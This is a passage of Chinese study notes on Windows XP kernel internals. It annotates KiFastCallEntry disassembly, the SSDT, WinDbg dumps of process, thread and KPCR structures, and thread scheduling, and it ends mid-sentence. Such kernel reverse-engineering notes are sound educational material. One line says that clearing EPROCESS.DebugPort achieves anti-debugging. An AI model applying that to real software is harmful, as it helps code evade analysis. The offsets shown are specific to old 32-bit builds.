图上两个颜色是因为一个是Ntoskrl.exe导出的函数，一个是Win32k.sys导出的函数。可以通过_KTHREAD[0xe0]找到。\n如何使用：\n先看第12位是0还是1，0则用Ntoskrl.exe模块查，否则用Win32k.sys模块查。 后面的第12位则是对应函数地址表与函数参数表的索引（两个索引相同）。 _KiFastCallEntry：\n.text:004076F0 _KiFastCallEntry proc near ; DATA XREF: _KiTrap01+6F↓o .text:004076F0 ; KiLoadFastSyscallMachineSpecificRegisters(x)+24↓o .text:004076F0 .text:004076F0 var_B = byte ptr -0Bh .text:004076F0 .text:004076F0 ; FUNCTION CHUNK AT .text:004076C8 SIZE 00000023 BYTES .text:004076F0 ; FUNCTION CHUNK AT .text:00407990 SIZE 00000014 BYTES .text:004076F0 .text:004076F0 mov ecx, 23h ; '#' .text:004076F5 push 30h ; '0' .text:004076F7 pop fs ; 一样将fs置为0x30 .text:004076F9 mov ds, ecx .text:004076FB mov es, ecx ; 将ds和es都置为0x23 .text:004076FD mov ecx, ds:0FFDFF040h ; 将ecx置为_KPCR[0x40] =\u003e TSS .text:00407703 mov esp, [ecx+4] ; 将esp置为TSS[0x4] =\u003e esp0 .text:00407706 push 23h ; '#' ; 存入0x23作为ss（三环） .text:00407708 push edx ; 存入edx作为esp（三环） .text:00407709 pushf .text:0040770A .text:0040770A loc_40770A: ; CODE XREF: _KiFastCallEntry2+22↑j .text:0040770A push 2 ; 存入cs（三环） .text:0040770C add edx, 8 .text:0040770F popf ; eflag = 2 .text:00407710 or [esp+0Ch+var_B], 2 ; 设置存入的eflag的第二个位 .text:00407715 push 1Bh ; cs = 0x1b .text:00407717 push dword ptr ds:0FFDF0304h .text:0040771D push 0 ; ErrCode = 0 .text:0040771F push ebp .text:00407720 push ebx .text:00407721 push esi .text:00407722 push edi ; 对应存入直到图中的0x54 .text:00407723 mov ebx, ds:0FFDFF01Ch ; ebx = _KPCR.SelfPcr（就是_KPCR自己的起始地址） .text:00407729 push 3Bh ; ';' ; fs = 0x3b .text:0040772B mov esi, [ebx+124h] ; esi = _KPCRB.CurrentThread .text:00407731 push dword ptr [ebx] ; 保存旧ExceptionList .text:00407733 mov dword ptr [ebx], -1 ; 将新的ExceptionList置为-1 .text:00407739 mov ebp, [esi+18h] ; ebp = _KTHREAD.InitialStack .text:0040773C push 1 ; 将先前模式位置为1 .text:0040773E sub esp, 48h ; esp指向TrapFrame开始位置 .text:00407741 sub ebp, 29Ch .text:00407747 mov byte ptr [esi+140h], 1 ; 将先前模式置为1 .text:0040774E cmp ebp, esp .text:00407750 jnz loc_4076C8 .text:00407756 and dword ptr [ebp+2Ch], 0 .text:0040775A test byte ptr [esi+2Ch], 0FFh ; DebugActive == -1 ？ .text:0040775E mov [esi+134h], ebp ; 替换TrapFrame .text:00407764 jnz Dr_FastCallDrSave ; 是，跳过去的流程主要是将调试寄存器dr0~dr7赋值 .text:0040776A .text:0040776A loc_40776A: ; CODE XREF: Dr_FastCallDrSave+10↑j .text:0040776A ; Dr_FastCallDrSave+7C↑j .text:0040776A mov ebx, [ebp+60h] ; ebx = TrapFrame.Ebp .text:0040776D mov edi, [ebp+68h] ; edi = TrapFrame.Eip .text:00407770 mov [ebp+0Ch], edx .text:00407773 mov dword ptr [ebp+8], 0BADB0D00h .text:0040777A mov [ebp+0], ebx .text:0040777D mov [ebp+4], edi ; 赋值调试的寄存器0x00~0xc .text:00407780 sti .text:00407781 .text:00407781 loc_407781: ; CODE XREF: _KiBBTUnexpectedRange+18↑j .text:00407781 ; _KiSystemService+6E↑j .text:00407781 mov edi, eax ; 取服务号赋值给edi .text:00407783 shr edi, 8 ; 右移8位 .text:00407786 and edi, 110000b ; 取第13和12位（从0开始），如果第12位为1，edi才是0x10（01 0000），否则是00（00 0000） .text:00407786 ; 通过这个偏移可以实现使用的是哪张服务表（一个服务表4*4=0x10） .text:00407789 mov ecx, edi ; ecx = edi .text:0040778B add edi, [esi+0E0h] ; edi = _KTHREAD.ServiceTable .text:00407791 mov ebx, eax ; eax = ebx .text:00407793 and eax, 111111111111b ; 只要系统调用号的后12位 .text:00407798 cmp eax, [edi+8] ; 比较这个服务号是否在_SYSTEM_SERVICE_TABLE.ServiceLimit（有多少个函数）中 .text:0040779B jnb _KiBBTUnexpectedRange .text:004077A1 cmp ecx, 10000b ; 比较之前的那个第12位是否是1 .text:004077A4 jnz short loc_4077C0 ; 查找第一个系统服务表 .text:004077A6 mov ecx, ds:0FFDFF018h .text:004077AC xor ebx, ebx .text:004077AE .text:004077AE loc_4077AE: ; DATA XREF: _KiTrap0E+110↓o .text:004077AE or ebx, [ecx+0F70h] .text:004077B4 jz short loc_4077C0 .text:004077B6 push edx .text:004077B7 push eax .text:004077B8 call ds:_KeGdiFlushUserBatch .text:004077BE pop eax .text:004077BF pop edx .text:004077C0 .text:004077C0 loc_4077C0: ; CODE XREF: _KiFastCallEntry+B4↑j .text:004077C0 ; _KiFastCallEntry+C4↑j .text:004077C0 inc dword ptr ds:0FFDFF638h .text:004077C6 mov esi, edx ; esi = edx（三环参数的指针（lea edx, [esp+arg_4]）） .text:004077C8 mov ebx, [edi+0Ch] ; ebx = _SYSTEM_SERVICE_TABLE.ArgmentTable .text:004077CB xor ecx, ecx ; 清空ecx .text:004077CD mov cl, [eax+ebx] ; cl = 这个系统调用对应的参数的字节大小 .text:004077D0 mov edi, [edi] ; edi = _SYSTEM_SERVICE_TABLE.ServiecTable（函数地址表） .text:004077D2 mov ebx, [edi+eax*4] ; ebx = 0环函数的地址 .text:004077D5 sub esp, ecx ; 提升对应的参数个数个堆栈（这里的ecx是要执行的参数的字节大小） .text:004077D7 shr ecx, 2 ; 参数长度/4 = 参数个数（四字节），一次拷贝4字节，这是拷贝的次数 .text:004077DA mov edi, esp ; edi指向函数参数的位置 .text:004077DC cmp esi, ds:_MmUserProbeAddress .text:004077E2 jnb loc_407990 .text:004077E8 .text:004077E8 loc_4077E8: ; CODE XREF: _KiFastCallEntry+2A4↓j .text:004077E8 ; DATA XREF: _KiTrap0E+106↓o .text:004077E8 rep movsd ; 循环拷贝 .text:004077EA call ebx SSDT 除了可以用_KTHREAD[0xe0]可以访问，还可以使用SSDT访问（System Services Descriptor Table，系统服务描述表）。它是ntoskrnl.exe导出的一个全局变量\n查看：\nkd\u003e dd KeServiceDescriptorTable 80553fa0 80502b8c 00000000 0000011c 80503000 80553fb0 00000000 00000000 00000000 00000000 80553fc0 00000000 00000000 00000000 00000000 80553fd0 00000000 00000000 00000000 00000000 SSDT的每一个成员都是系统服务表，一共有四个成员（也就是四个系统服务表，但后两个未使用）。通过上面的指令我们只能看到一张表（ntoskrnl.exe的）\n查看完整的SSDT：\nkd\u003e dd KeServiceDescriptorTableShadow 80553f60 80502b8c 00000000 0000011c 80503000 80553f70 bf999b80 00000000 0000029b bf99a890 80553f80 00000000 00000000 00000000 00000000 80553f90 00000000 00000000 00000000 00000000 SSDT Shadow是未导出的，所以要通过其他的方法获取。\n第一个成员（80502b8c）：函数地址表 第二个成员（00000000）：这个服务表被访问了多少次 第三个成员（0000011c）：这个服务表一共有多少个函数 第四个函数（80503000）：函数参数表 进程与线程 进程结构体 EPROCESS\n每个windows进程在0环都有一个对应的结构体（EPROCESS），这个结构体包含了进程所有重要的信息。\nkd\u003e dt _EPROCESS ntdll!_EPROCESS +0x000 Pcb : _KPROCESS +0x06c ProcessLock : _EX_PUSH_LOCK +0x070 CreateTime : _LARGE_INTEGER +0x078 ExitTime : _LARGE_INTEGER +0x080 RundownProtect : _EX_RUNDOWN_REF +0x084 UniqueProcessId : Ptr32 Void +0x088 ActiveProcessLinks : _LIST_ENTRY +0x090 QuotaUsage : [3] Uint4B +0x09c QuotaPeak : [3] Uint4B +0x0a8 CommitCharge : Uint4B +0x0ac PeakVirtualSize : Uint4B +0x0b0 VirtualSize : Uint4B +0x0b4 SessionProcessLinks : _LIST_ENTRY +0x0bc DebugPort : Ptr32 Void +0x0c0 ExceptionPort : Ptr32 Void +0x0c4 ObjectTable : Ptr32 _HANDLE_TABLE +0x0c8 Token : _EX_FAST_REF +0x0cc WorkingSetLock : _FAST_MUTEX +0x0ec WorkingSetPage : Uint4B +0x0f0 AddressCreationLock : _FAST_MUTEX +0x110 HyperSpaceLock : Uint4B +0x114 ForkInProgress : Ptr32 _ETHREAD +0x118 HardwareTrigger : Uint4B +0x11c VadRoot : Ptr32 Void +0x120 VadHint : Ptr32 Void +0x124 CloneRoot : Ptr32 Void +0x128 NumberOfPrivatePages : Uint4B +0x12c NumberOfLockedPages : Uint4B +0x130 Win32Process : Ptr32 Void +0x134 Job : Ptr32 _EJOB +0x138 SectionObject : Ptr32 Void +0x13c SectionBaseAddress : Ptr32 Void +0x140 QuotaBlock : Ptr32 _EPROCESS_QUOTA_BLOCK +0x144 WorkingSetWatch : Ptr32 _PAGEFAULT_HISTORY +0x148 Win32WindowStation : Ptr32 Void +0x14c InheritedFromUniqueProcessId : Ptr32 Void +0x150 LdtInformation : Ptr32 Void +0x154 VadFreeHint : Ptr32 Void +0x158 VdmObjects : Ptr32 Void +0x15c DeviceMap : Ptr32 Void +0x160 PhysicalVadList : _LIST_ENTRY +0x168 PageDirectoryPte : _HARDWARE_PTE_X86 +0x168 Filler : Uint8B +0x170 Session : Ptr32 Void +0x174 ImageFileName : [16] UChar +0x184 JobLinks : _LIST_ENTRY +0x18c LockedPagesList : Ptr32 Void +0x190 ThreadListHead : _LIST_ENTRY +0x198 SecurityPort : Ptr32 Void +0x19c PaeTop : Ptr32 Void +0x1a0 ActiveThreads : Uint4B +0x1a4 GrantedAccess : Uint4B +0x1a8 DefaultHardErrorProcessing : Uint4B +0x1ac LastThreadExitStatus : Int4B +0x1b0 Peb : Ptr32 _PEB +0x1b4 PrefetchTrace : _EX_FAST_REF +0x1b8 ReadOperationCount : _LARGE_INTEGER +0x1c0 WriteOperationCount : _LARGE_INTEGER +0x1c8 OtherOperationCount : _LARGE_INTEGER +0x1d0 ReadTransferCount : _LARGE_INTEGER +0x1d8 WriteTransferCount : _LARGE_INTEGER +0x1e0 OtherTransferCount : _LARGE_INTEGER +0x1e8 CommitChargeLimit : Uint4B +0x1ec CommitChargePeak : Uint4B +0x1f0 AweInfo : Ptr32 Void +0x1f4 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO +0x1f8 Vm : _MMSUPPORT +0x238 LastFaultCount : Uint4B +0x23c ModifiedPageCount : Uint4B +0x240 NumberOfVads : Uint4B +0x244 JobStatus : Uint4B +0x248 Flags : Uint4B +0x248 CreateReported : Pos 0, 1 Bit +0x248 NoDebugInherit : Pos 1, 1 Bit +0x248 ProcessExiting : Pos 2, 1 Bit +0x248 ProcessDelete : Pos 3, 1 Bit +0x248 Wow64SplitPages : Pos 4, 1 Bit +0x248 VmDeleted : Pos 5, 1 Bit +0x248 OutswapEnabled : Pos 6, 1 Bit +0x248 Outswapped : Pos 7, 1 Bit +0x248 ForkFailed : Pos 8, 1 Bit +0x248 HasPhysicalVad : Pos 9, 1 Bit +0x248 AddressSpaceInitialized : Pos 10, 2 Bits +0x248 SetTimerResolution : Pos 12, 1 Bit +0x248 BreakOnTermination : Pos 13, 1 Bit +0x248 SessionCreationUnderway : Pos 14, 1 Bit +0x248 WriteWatch : Pos 15, 1 Bit +0x248 ProcessInSession : Pos 16, 1 Bit +0x248 OverrideAddressSpace : Pos 17, 1 Bit +0x248 HasAddressSpace : Pos 18, 1 Bit +0x248 LaunchPrefetched : Pos 19, 1 Bit +0x248 InjectInpageErrors : Pos 20, 1 Bit +0x248 VmTopDown : Pos 21, 1 Bit +0x248 Unused3 : Pos 22, 1 Bit +0x248 Unused4 : Pos 23, 1 Bit +0x248 VdmAllowed : Pos 24, 1 Bit +0x248 Unused : Pos 25, 5 Bits +0x248 Unused1 : Pos 30, 1 Bit +0x248 Unused2 : Pos 31, 1 Bit +0x24c ExitStatus : Int4B +0x250 NextPageColor : Uint2B +0x252 SubSystemMinorVersion : UChar +0x253 SubSystemMajorVersion : UChar +0x252 SubSystemVersion : Uint2B +0x254 PriorityClass : UChar +0x255 WorkingSetAcquiredUnsafe : UChar +0x258 Cookie : Uint4B 第一个子成员为KPROCESS：\nkd\u003e dt _KPROCESS ntdll!_KPROCESS +0x000 Header : _DISPATCHER_HEADER +0x010 ProfileListHead : _LIST_ENTRY +0x018 DirectoryTableBase : [2] Uint4B +0x020 LdtDescriptor : _KGDTENTRY +0x028 Int21Descriptor : _KIDTENTRY +0x030 IopmOffset : Uint2B +0x032 Iopl : UChar +0x033 Unused : UChar +0x034 ActiveProcessors : Uint4B +0x038 KernelTime : Uint4B +0x03c UserTime : Uint4B +0x040 ReadyListHead : _LIST_ENTRY +0x048 SwapListEntry : _SINGLE_LIST_ENTRY +0x04c VdmTrapcHandler : Ptr32 Void +0x050 ThreadListHead : _LIST_ENTRY +0x058 ProcessLock : Uint4B +0x05c Affinity : Uint4B +0x060 StackCount : Uint2B +0x062 BasePriority : Char +0x063 ThreadQuantum : Char +0x064 AutoAlignment : UChar +0x065 State : UChar +0x066 ThreadSeed : UChar +0x067 DisableBoost : UChar +0x068 PowerState : UChar +0x069 DisableQuantum : UChar +0x06a IdealNode : UChar +0x06b Flags : _KEXECUTE_OPTIONS +0x06b ExecuteOptions : UChar KPROCESS中一些重要的成员：\nHeader\nKPROCESS的第一个成员，以它开头的内核对象可以被WaitForSingleObject函数所等待（比如Mutex互斥体，Event事件等）\nDirectoryTableBase\nKPROCESS[0x18]，为页目录表基址。\nKernelTime | UserTime\nKPROCESS[0x38~0x3c]，在0环和在3环的运行时间。\nAffinity\nKPROCESS[0x5c]，规定进程里面的所有线程能在哪个CPU上跑。\n如果为1（00000001），只能在0号CPU上跑。\n如果为3（00000011），只能在0、1号CPU上跑。\n如果为5（00000101），只能在0、2号CPU上跑。\n32位下这个成员为4字节，共32位，32个核；64位下这个成员为8字节，也就是64个核。\nBasePriority\nKPROCESS[0x62]，基础优先级或最低优先级，该进程中最起始创建的优先级。\nEPROCESS中一些重要的成员：\nCreateTime | ExitTime\nEPROCESS[0x70~0x78]，进程何时创建的和何时退出的。\nUniqueProcessId\nEPROCESS[0x84]，进程的PID。\nActiveProcessLinks\nEPROCESS[0x88]，所有的活动进程都连接在一起，构成的双向链表。全局变量PsActiveProcessHead指向这个全局链的表头。\nQuotaUsage | QuotaPeak\nEPROCESS[0x90~0x9c]，物理页相关的统计信息。\nCommitCharge | PeakVirtualSize | VirtualSize\nEPROCESS[0xa8~0xb0]，虚拟内存相关的统计信息。\nVadRoot\nEPROCESS[0x11c]，进程的线性地址的使用情况和记录（0~2G哪些地址没有占用）。\nDebugPort | ExceptionPort\nEPROCESS[0xbc~0xc0]，调试相关，DebugPort清零实现反调试。\nObjectTable\nEPROCESS[0xc4]，句柄表，会存储这个进程中所有内核对象的地址。\nImageFileName\nEPROCESS[0x174]，进程镜像文件名，最多16个字节。\nActiveThreads\nEPROCESS[0x1a0]，活动线程的数量。\nPeb\nEPROCESS[0x1b0]，进程环境块，是进程在3环的一个结构体，里面包含了进程的模块列表、是否处于调试状态等信息。\n在PEB[0xc]处为+0x00c Ldr : Ptr32 _PEB_LDR_DATA\n看一下这个结构，有三个双向链表：\nkd\u003e dt _PEB_LDR_DATA ntdll!_PEB_LDR_DATA +0x000 Length : Uint4B +0x004 Initialized : UChar +0x008 SsHandle : Ptr32 Void +0x00c InLoadOrderModuleList : _LIST_ENTRY +0x014 InMemoryOrderModuleList : _LIST_ENTRY +0x01c InInitializationOrderModuleList : _LIST_ENTRY +0x024 EntryInProgress : Ptr32 Void InLoadOrderModuleList：该模块加载的顺序\nInMemoryOrderModuleList：该模块在内存中的顺序\nInInitializationOrderModuleList：该模块初始化的顺序\n线程结构体 ETHREAD\n每个线程对于的结构体：\nkd\u003e dt _ETHREAD ntdll!_ETHREAD +0x000 Tcb : _KTHREAD +0x1c0 CreateTime : _LARGE_INTEGER +0x1c0 NestedFaultCount : Pos 0, 2 Bits +0x1c0 ApcNeeded : Pos 2, 1 Bit +0x1c8 ExitTime : _LARGE_INTEGER +0x1c8 LpcReplyChain : _LIST_ENTRY +0x1c8 KeyedWaitChain : _LIST_ENTRY +0x1d0 ExitStatus : Int4B +0x1d0 OfsChain : Ptr32 Void +0x1d4 PostBlockList : _LIST_ENTRY +0x1dc TerminationPort : Ptr32 _TERMINATION_PORT +0x1dc ReaperLink : Ptr32 _ETHREAD +0x1dc KeyedWaitValue : Ptr32 Void +0x1e0 ActiveTimerListLock : Uint4B +0x1e4 ActiveTimerListHead : _LIST_ENTRY +0x1ec Cid : _CLIENT_ID +0x1f4 LpcReplySemaphore : _KSEMAPHORE +0x1f4 KeyedWaitSemaphore : _KSEMAPHORE +0x208 LpcReplyMessage : Ptr32 Void +0x208 LpcWaitingOnPort : Ptr32 Void +0x20c ImpersonationInfo : Ptr32 _PS_IMPERSONATION_INFORMATION +0x210 IrpList : _LIST_ENTRY +0x218 TopLevelIrp : Uint4B +0x21c DeviceToVerify : Ptr32 _DEVICE_OBJECT +0x220 ThreadsProcess : Ptr32 _EPROCESS +0x224 StartAddress : Ptr32 Void +0x228 Win32StartAddress : Ptr32 Void +0x228 LpcReceivedMessageId : Uint4B +0x22c ThreadListEntry : _LIST_ENTRY +0x234 RundownProtect : _EX_RUNDOWN_REF +0x238 ThreadLock : _EX_PUSH_LOCK +0x23c LpcReplyMessageId : Uint4B +0x240 ReadClusterSize : Uint4B +0x244 GrantedAccess : Uint4B +0x248 CrossThreadFlags : Uint4B +0x248 Terminated : Pos 0, 1 Bit +0x248 DeadThread : Pos 1, 1 Bit +0x248 HideFromDebugger : Pos 2, 1 Bit +0x248 ActiveImpersonationInfo : Pos 3, 1 Bit +0x248 SystemThread : Pos 4, 1 Bit +0x248 HardErrorsAreDisabled : Pos 5, 1 Bit +0x248 BreakOnTermination : Pos 6, 1 Bit +0x248 SkipCreationMsg : Pos 7, 1 Bit +0x248 SkipTerminationMsg : Pos 8, 1 Bit +0x24c SameThreadPassiveFlags : Uint4B +0x24c ActiveExWorker : Pos 0, 1 Bit +0x24c ExWorkerCanWaitUser : Pos 1, 1 Bit +0x24c MemoryMaker : Pos 2, 1 Bit +0x250 SameThreadApcFlags : Uint4B +0x250 LpcReceivedMsgIdValid : Pos 0, 1 Bit +0x250 LpcExitThreadCalled : Pos 1, 1 Bit +0x250 AddressSpaceOwner : Pos 2, 1 Bit +0x254 ForwardClusterOnly : UChar +0x255 DisablePageFaultClustering : UChar 第一个子成员为KTHREAD：\nkd\u003e dt _KTHREAD ntdll!_KTHREAD +0x000 Header : _DISPATCHER_HEADER +0x010 MutantListHead : _LIST_ENTRY +0x018 InitialStack : Ptr32 Void +0x01c StackLimit : Ptr32 Void +0x020 Teb : Ptr32 Void +0x024 TlsArray : Ptr32 Void +0x028 KernelStack : Ptr32 Void +0x02c DebugActive : UChar +0x02d State : UChar +0x02e Alerted : [2] UChar +0x030 Iopl : UChar +0x031 NpxState : UChar +0x032 Saturation : Char +0x033 Priority : Char +0x034 ApcState : _KAPC_STATE +0x04c ContextSwitches : Uint4B +0x050 IdleSwapBlock : UChar +0x051 Spare0 : [3] UChar +0x054 WaitStatus : Int4B +0x058 WaitIrql : UChar +0x059 WaitMode : Char +0x05a WaitNext : UChar +0x05b WaitReason : UChar +0x05c WaitBlockList : Ptr32 _KWAIT_BLOCK +0x060 WaitListEntry : _LIST_ENTRY +0x060 SwapListEntry : _SINGLE_LIST_ENTRY +0x068 WaitTime : Uint4B +0x06c BasePriority : Char +0x06d DecrementCount : UChar +0x06e PriorityDecrement : Char +0x06f Quantum : Char +0x070 WaitBlock : [4] _KWAIT_BLOCK +0x0d0 LegoData : Ptr32 Void +0x0d4 KernelApcDisable : Uint4B +0x0d8 UserAffinity : Uint4B +0x0dc SystemAffinityActive : UChar +0x0dd PowerState : UChar +0x0de NpxIrql : UChar +0x0df InitialNode : UChar +0x0e0 ServiceTable : Ptr32 Void +0x0e4 Queue : Ptr32 _KQUEUE +0x0e8 ApcQueueLock : Uint4B +0x0f0 Timer : _KTIMER +0x118 QueueListEntry : _LIST_ENTRY +0x120 SoftAffinity : Uint4B +0x124 Affinity : Uint4B +0x128 Preempted : UChar +0x129 ProcessReadyQueue : UChar +0x12a KernelStackResident : UChar +0x12b NextProcessor : UChar +0x12c CallbackStack : Ptr32 Void +0x130 Win32Thread : Ptr32 Void +0x134 TrapFrame : Ptr32 _KTRAP_FRAME +0x138 ApcStatePointer : [2] Ptr32 _KAPC_STATE +0x140 PreviousMode : Char +0x141 EnableStackSwap : UChar +0x142 LargeStack : UChar +0x143 ResourceIndex : UChar +0x144 KernelTime : Uint4B +0x148 UserTime : Uint4B +0x14c SavedApcState : _KAPC_STATE +0x164 Alertable : UChar +0x165 ApcStateIndex : UChar +0x166 ApcQueueable : UChar +0x167 AutoAlignment : UChar +0x168 StackBase : Ptr32 Void +0x16c SuspendApc : _KAPC +0x19c SuspendSemaphore : _KSEMAPHORE +0x1b0 ThreadListEntry : _LIST_ENTRY +0x1b8 FreezeCount : Char +0x1b9 SuspendCount : Char +0x1ba IdealProcessor : UChar +0x1bb DisableBoost : UChar KTHREAD中一些重要的成员：\nHeader\nKPROCESS的第一个成员，以它开头的内核对象可以被WaitForSingleObject函数所等待（比如Mutex互斥体，Event事件等）\n+0x018 InitialStack : Ptr32 Void +0x01c StackLimit : Ptr32 Void +0x028 KernelStack : Ptr32 Void 与线程切换相关\n+0x020 Teb : Ptr32 Void 线程环境块，大小4KB，位于用户地址空间。FS:[0] -\u003e TEB（三环时，零环时为KPCR）\n+0x02c DebugActive : UChar 如果值为-1，就不能使用调试寄存器：Dr0~Dr7\n+0x034 ApcState : _KAPC_STATE +0x0e8 ApcQueueLock : Uint4B +0x14c SavedApcState : _KAPC_STATE APC相关。\n+0x02d State : UChar 线程状态，就绪、等待还是运行。\n+0x06c BasePriority : Char 其初始值所属进程的KPROCESS -\u003e BasePriority值，以后可以通过KeSetBasePriorityThread()函数重新设定。\n+0x070 WaitBlock : [4] _KWAIT_BLOCK WaitForSingleObject()等待哪个对象。\n+0x0e0 ServiceTable : Ptr32 Void 指向系统服务表基地址。\n+0x134 TrapFrame : Ptr32 _KTRAP_FRAME 进0环时保存环境。\n+0x140 PreviousMode : Char 先前模式。\n+0x1b0 ThreadListEntry : _LIST_ENTRY 双向链表一个进程所有的线程，都挂在一个链表中，挂的就是这个位置，一共有两个这样的链表。\n结构如下：\nETHREAD中一些重要的成员：\n+0x1ec Cid : _CLIENT_ID ntdll!_CLIENT_ID +0x000 UniqueProcess : Ptr32 Void\t//这个线程属于哪个进程 +0x004 UniqueThread : Ptr32 Void 进程ID，线程ID\n+0x220 ThreadsProcess : Ptr32 _EPROCESS 指向自己所属的进程。\n+0x22c ThreadListEntry : _LIST_ENTRY 双向链表一个进程所有的线程，都挂在一个链表中，挂的就是这个位置，一共有两个这样的链表。\nKPCR 当运行的CPU需要一些结构体来存储数据\n属性：\n当进入0环时，FS[0] -\u003e KPCR（3环指向TEB） 一个CPU一个KPCR。 KPCR存储了CPU需要的一些重要的数据：GDT、IDT和线程相关的一些信息。 结构：\nkd\u003e dt _KPCR nt!_KPCR +0x000 NtTib : _NT_TIB +0x01c SelfPcr : Ptr32 _KPCR +0x020 Prcb : Ptr32 _KPRCB +0x024 Irql : UChar +0x028 IRR : Uint4B +0x02c IrrActive : Uint4B +0x030 IDR : Uint4B +0x034 KdVersionBlock : Ptr32 Void +0x038 IDT : Ptr32 _KIDTENTRY +0x03c GDT : Ptr32 _KGDTENTRY +0x040 TSS : Ptr32 _KTSS +0x044 MajorVersion : Uint2B +0x046 MinorVersion : Uint2B +0x048 SetMember : Uint4B +0x04c StallScaleFactor : Uint4B +0x050 DebugActive : UChar +0x051 Number : UChar +0x052 Spare0 : UChar +0x053 SecondLevelCacheAssociativity : UChar +0x054 VdmAlert : Uint4B +0x058 KernelReserved : [14] Uint4B +0x090 SecondLevelCacheSize : Uint4B +0x094 HalReserved : [16] Uint4B +0x0d4 InterruptMode : Uint4B +0x0d8 Spare1 : UChar +0x0dc KernelReserved2 : [17] Uint4B +0x120 PrcbData : _KPRCB 第一个子成员为NT_TIB：\nkd\u003e dt _NT_TIB ntdll!_NT_TIB +0x000 ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD +0x004 StackBase : Ptr32 Void +0x008 StackLimit : Ptr32 Void +0x00c SubSystemTib : Ptr32 Void +0x010 FiberData : Ptr32 Void +0x010 Version : Uint4B +0x014 ArbitraryUserPointer : Ptr32 Void +0x018 Self : Ptr32 _NT_TIB NT_TIB中一些重要的成员：\n+0x000 ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD 当前线程内核异常处理的链表。\n+0x004 StackBase : Ptr32 Void +0x008 StackLimit : Ptr32 Void 当前线程内核的栈基址与大小。\n+0x018 Self : Ptr32 _NT_TIB 指向自己，方便查找。\nKPCR中一些重要的成员：\n+0x01c SelfPcr : Ptr32 _KPCR 指向自己，方便查找。\n+0x020 Prcb : Ptr32 _KPRCB 指向扩展结构PRCB。\n+0x038 IDT : Ptr32 _KIDTENTRY 指向IDT表。\n+0x03c GDT : Ptr32 _KGDTENTRY 指向GDT表。\n+0x040 TSS : Ptr32 _KTSS 指向TSS，每个CPU都有一个TSS。\n+0x051 Number : UChar CPU编号。\n+0x120 PrcbData : _KPRCB 扩展结构体。\n等待线程_调度线程 CPU如何调度线程\n等待链表\nkd\u003e dd KiWaitListHead 线程调用了Sleep()或者WaitForSingleObject()时，就挂到这个链表。\n线程有3种状态：就绪、等待、运行。\n正在运行种的线程存储在KPCR中，就绪和等待的线程全部在另外的33个链表中。一个等待链表，32个就绪链表。\n调度链表\nkd\u003e dd KiDispatcherReadyListHead L70 这其中每一个链表都存储不同级别的线程。（0~31级）\n（如果fd = bk = 当前地址，那么这个链表为空。我们看的时候处于调试状态，全部的线程都会挂起，所以都是空的。）\n32位系统有32个就绪链表，64位系统就有64个就绪链表。\n正在运行的线程在KPCR中。\n这两个结构挂载在_KTHREAD[0x60]\n+0x060 WaitListEntry : _LIST_ENTRY //等待 +0x060 SwapListEntry : _SINGLE_LIST_ENTRY //挂起 主动切换 windows中绝大部分API都调用了SwapContext函数，当线程只要调用了API，就会导致线程切换。 线程切换时会比较是否属于同一进程，如果不是，切换Cr3，Cr3换了，进程也就切换了。 时钟中断切换 如何中断一个正在执行的程序：\n异常（缺页与int n） 中断（时钟中断） 系统时钟\n（IDT）中断号 IRQ 说明 0x30 IRQ0 时钟中断 操作系统每隔10~20毫秒会触发一次时钟中断，可以通过GetSystemTimeAdjustment获取当前操作系统的时钟间隔值。\n时钟中断的执行流程\nKiStartUnexpectedRange –\u003e KiEndUnexpectedRange –\u003e KiUnexpectedInterruptTail –\u003e HalBeginSystemInterrupt –\u003e HalEndSystemInterrupt –\u003e KiDispatchInterrupt –\u003e SwapContext\n总结\n线程切换的几种方式：\n主动调用API函数 时钟中断 异常处理 如果一个线程不调用API，在代码中屏蔽中断（CLI指令），并且不会出现异常，那么该线程将永久占有CPU，单核占有率为100%，双核占有率为50%。\n时间片管理 时钟中断时有两种情况会导致线程切换：\n当前的CPU时间片到期 有备用线程（KPCR.PrcbData.NextThread） 什么是CPU时间片？\n当一个新线程开始执行时，初始化程序会在_KTHREAD.Quantum赋初始值，该值大小由_KPROCESS.ThreadQuantum决定。 每次时钟中断会调用KeUpdateRunTime函数，该函数每次将当前线程的Quantum减少3个单位。如果减到0，就将KPCR.PrcbData.QuantumEnd（标志当前CPU时间片是否用完，没用完是0）的值设置为非0。 每次系统时钟执行完毕后都会执行KiDispatchInterrupt，来判断时间片是否到期。 时间片到期后会调用KiQuantumEnd重新设置时间片，找到要运行的线程 graph TB A[KeUpdateRunTime] --\u003e B[KiDispatchInterrupt（时间片是否到期?）]; B --否--\u003e A B --是--\u003e D[KiQuantumEnd] 线程切换的几种方式：\n当前线程主动调用API函数\nAPI函数 –\u003e KiSwapThread –\u003e KiSwapContext –\u003e SwapContext\n当前的CPU时间片到期\nKiDispatchInterrupt –\u003e KiQuantumEnd –\u003e KiSwapContext –\u003e SwapContext\n有备用线程（KPCR.PrcbData.NextThread）\nKiDispatchInterrupt –\u003e SwapContext\n线程切换TSS 内核堆栈\n在_KTHREAD结构体中存在内核堆栈的三个成员：\nntdll!_KTHREAD +0x018 InitialStack : Ptr32 Void //栈底 +0x01c StackLimit : Ptr32 Void //栈的边界 +0x028 KernelStack : Ptr32 Void //栈顶 在内存中如下：\n调用API进0环\n普通调用：通过TSS.ESP0得到0环堆栈\n快速调用：从MSR得到一个临时0环栈，代码执行后仍然通过TSS.ESP0得到当前线程0环堆栈\n线程切换FS 系统中存在着许多的线程，这就意味着FS:[0]在3环时指向的TEB要有多个（每个线程一份），FS的段选择子都相同，如何实现使用一个FS寄存器指向多个TEB？\n.text:004049D7 mov eax, [ebx+18h] ; TEB .text:004049DA mov ecx, [ebx+3Ch] ; GDT .text:004049DD mov [ecx+3Ah], ax .text:004049E1 shr eax, 10h .text:004049E4 mov [ecx+3Ch], al .text:004049E7 mov [ecx+3Fh], ah 相当于改了对应段描述符的base（三部分），使它指向不同的TEB。\n线程优先级 在KiSwapThread与KiQuantumEnd函数中，都是通过KiFindReadyThread来找下一个要切换的线程的，KiFindReadyThread是根据什么条件来选择下一个要执行的线程的？\nKiFindReadyThread查找方式：\n按照优先级来查找：31 -\u003e 30 -\u003e 29 -\u003e ……\n如果31级别的链表中有线程，那么就不会查找比它级别低的链表的。（每一次只查找最高的）\n优化\n调度链表有32个，每次从头开始找效率太低，Windows通过一个DWORD类型的变量来记录。\n当向调度链表中挂入或摘除某个进程时，会判断当前链表是否为空（fd = bk = 